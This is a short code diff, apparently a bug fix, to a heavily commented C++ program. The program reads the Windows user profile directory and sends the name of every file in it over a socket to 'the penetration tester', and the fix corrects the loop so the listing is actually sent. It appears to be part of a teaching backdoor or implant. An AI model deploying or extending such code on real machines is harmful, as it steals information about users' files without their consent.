@@ -34,7 +34,7 @@ using namespace std;
 char* userDirectory() { /* return a pointer to a string */
 	char* pPath; // variable pointer to path
 	pPath = getenv ("USERPROFILE"); /* we use the function getenv that is shipped with the previously included headers in order to know the user's directory location - in this case, it is kept in an environment variable of the Windows system called "userprofile" */ 
-	if (pPath!=NULL){
+	if (pPath != NULL){
 		return pPath; //return directory path and exit function
 	} else {
 		perror(""); //else print error and exit
@@ -60,7 +60,7 @@ int main (){
 	DIR *dir; //new var named dir: pointer to type DIR
 	struct dirent *ent; //new variable named ent: pointer to structure
 	if ((dir = opendir (pPath)) != NULL){ //if opening directory at retrieved path brings any results
-	while ((ent - readdir (dir)) != NULL) { // iterate over items within the directory, as long as there are next items: 
+	while ((ent = readdir (dir)) != NULL) { // iterate over items within the directory, as long as there are next items: 
 	send(server, ent->d_name, sizeof(ent->d_name), 0); //send name of current item (file or directory contained within user's path) to the penetration tester
 }
 	closedir (dir); //close the directory that was read
